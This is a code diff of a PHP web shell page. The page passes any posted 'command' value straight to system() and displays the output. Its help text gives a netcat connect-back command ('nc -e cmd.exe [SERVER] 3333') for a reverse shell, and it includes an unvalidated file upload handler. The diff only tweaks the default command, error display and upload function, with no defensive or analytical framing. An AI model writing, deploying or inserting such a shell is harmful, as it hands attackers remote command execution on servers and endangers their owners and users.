@@ -93,11 +93,19 @@ cursor:crosshair
             <p align="center">
               <?php
               if (empty($_POST['command'])) {
-                $_POST['command'] = "ls";
+                $_POST['command'] = "ls -ltr";
               }
               ?>
-              <textarea readonly size="1" rows="7"
-                cols="53"><?php @$output = empty(system($_POST['command'])); ?></textarea><br>
+              <textarea readonly size="1" rows="7" cols="53">
+                <?php
+                error_reporting(E_ALL);
+                ini_set("display_errors", 1);
+
+                $elOutput = empty(system($_POST['command'])); 
+                print_r($elOutput);
+
+                ?>
+              </textarea><br>
               <br>
               <font face="Verdana" style="font-size: 8pt"><b>Info:</b> For a connect
                 back Shell, use: <i>nc -e cmd.exe [SERVER] 3333<br>
@@ -126,8 +134,8 @@ cursor:crosshair
               $file_ext = strtolower(end(explode('.', $_FILES['image']['name'])));
 
               if (empty($errors) == true) {
-                //move_uploaded_file($file_tmp, $file_name);
-                copy($file_tmp,$file_name);
+                move_uploaded_file($file_tmp, $file_name);
+                //copy($file_tmp,$file_name);
                 echo "Success";
               } else {
                 print_r($errors);
